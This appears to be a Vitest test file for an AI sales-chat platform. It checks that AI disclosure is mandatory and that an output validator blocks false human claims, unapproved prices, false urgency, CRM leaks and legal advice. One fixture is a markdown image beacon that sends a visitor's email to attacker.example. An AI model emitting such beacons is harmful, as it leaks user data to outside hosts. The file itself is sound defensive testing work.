import { describe, expect, it } from 'vitest';
import { validateOutput, BLOCKED_OUTPUT_REPLACEMENT } from '@detent/awa-agent';
import { approvedFigures } from '@detent/awa-policy';
import { buildHarness, bearer } from './fixtures/tenant.js';

/**
 * CI gates: AI disclosure (100% of sessions, both modalities) and adversarial
 * output validation, zero claims to be human, zero unapproved figures, zero
 * outbound exfiltration references (sections 25.4, 30, 36.2).
 */
describe('AI disclosure, EU AI Act Article 50', () => {
  it('is present at session open in text', async () => {
    const harness = await buildHarness();
    const response = await harness.api.handle({
      method: 'POST', path: '/v1/sessions', headers: bearer(harness.widgetKey), body: {},
    });
    const body = response.body as { disclosure: string };
    expect(body.disclosure.length).toBeGreaterThan(20);
    expect(body.disclosure.toLowerCase()).toContain('ai');
  });

  it('is present in voice, with voice-specific wording', async () => {
    const harness = await buildHarness();
    const response = await harness.api.handle({
      method: 'POST', path: '/v1/sessions', headers: bearer(harness.widgetKey), body: { modality: 'voice' },
    });
    const body = response.body as { disclosure: string };
    expect(body.disclosure).toBe(harness.config.disclosure.voiceText);
  });

  it('appears on the first turn of every session and is audited', async () => {
    const harness = await buildHarness({ script: [{ match: /.*/, output: { text: 'Happy to help.' } }] });
    const session = await harness.platform.openSession(harness.config.tenantId, 'UK');
    const turn = await harness.platform.orchestrator.run({
      session, config: harness.platform.effectiveConfig(session.tenantId), visitorInput: 'hello',
    });
    expect(turn.disclosure).toBeDefined();

    const audit = await harness.platform.audit.export(session.tenantId);
    expect(audit.entries.some((e) => e.type === 'disclosure_shown')).toBe(true);
  });

  it('cannot be disabled or emptied by a tenant', async () => {
    const harness = await buildHarness();
    await expect(
      harness.platform.tenants.update(harness.config.tenantId, {
        disclosure: { text: '', voiceText: '' },
      }, 'tenant_admin'),
    ).rejects.toThrowError(/cannot be removed/);

    await expect(
      harness.platform.tenants.update(harness.config.tenantId, {
        disclosure: { text: 'Hi.', voiceText: 'Hi.' },
      }, 'tenant_admin'),
    ).rejects.toThrowError(/cannot be removed/);
  });
});

describe('output validation', async () => {
  const { config } = await buildHarness();
  const figures = approvedFigures(config);

  it('blocks a claim to be human', () => {
    const verdict = validateOutput({
      text: "No, I'm a real person, I work on the sales desk here.",
      config, approvedFigures: figures,
    });
    expect(verdict.allowed).toBe(false);
    expect(verdict.violations).toContain('claims_to_be_human');
  });

  it('blocks an unapproved price', () => {
    const verdict = validateOutput({
      text: 'We can do that for £2,750 if you sign this month.',
      config, approvedFigures: figures,
    });
    expect(verdict.allowed).toBe(false);
    expect(verdict.violations).toContain('unapproved_figure');
  });

  it('allows an approved price stated verbatim', () => {
    const verdict = validateOutput({
      text: 'Contract review is £4500 per engagement. That covers a fixed scope of up to 25 contracts.',
      config, approvedFigures: figures,
    });
    expect(verdict.allowed).toBe(true);
  });

  it('blocks manufactured urgency', () => {
    const verdict = validateOutput({
      text: 'Only 2 slots left this quarter, act now before prices go up.',
      config, approvedFigures: figures,
    });
    expect(verdict.allowed).toBe(false);
    expect(verdict.violations).toContain('manufactured_urgency');
  });

  it('strips a markdown image beacon pointing off the allowlist', () => {
    const verdict = validateOutput({
      text: 'Sure. ![](https://attacker.example/log?data=alex@acme.co.uk) Here is the summary.',
      config, approvedFigures: figures,
    });
    expect(verdict.violations).toContain('unapproved_outbound_reference');
    expect(verdict.text).not.toContain('attacker.example');
  });

  it('permits a link to a host on the tenant allowlist, including subdomains', () => {
    const verdict = validateOutput({
      text: 'The case study is here: https://www.acme.co.uk/case-studies/contract-review',
      config, approvedFigures: figures,
    });
    expect(verdict.allowed).toBe(true);
    expect(verdict.text).toContain('acme.co.uk');
  });

  it('blocks a response that discloses CRM record contents', () => {
    const verdict = validateOutput({
      text: 'I can see you have an open deal with us, and your account manager is Priya Raman.',
      config, approvedFigures: figures,
    });
    expect(verdict.allowed).toBe(false);
    expect(verdict.violations).toContain('crm_disclosure');
  });

  it('blocks regulated advice', () => {
    const verdict = validateOutput({
      text: 'You are legally entitled to terminate that contract without notice.',
      config, approvedFigures: figures,
    });
    expect(verdict.allowed).toBe(false);
    expect(verdict.violations).toContain('regulated_advice');
  });

  it('substitutes an honest replacement when output is blocked', async () => {
    const harness = await buildHarness({
      script: [{ match: /price/i, output: { text: 'Just for you, £999 and I can confirm that now.' } }],
    });
    const session = await harness.platform.openSession(harness.config.tenantId, 'UK');
    const turn = await harness.platform.orchestrator.run({
      session, config: harness.platform.effectiveConfig(session.tenantId),
      visitorInput: 'what is the price',
    });
    expect(turn.text).toBe(BLOCKED_OUTPUT_REPLACEMENT);
    const audit = await harness.platform.audit.export(session.tenantId);
    expect(audit.entries.some((e) => e.type === 'output_blocked')).toBe(true);
  });
});
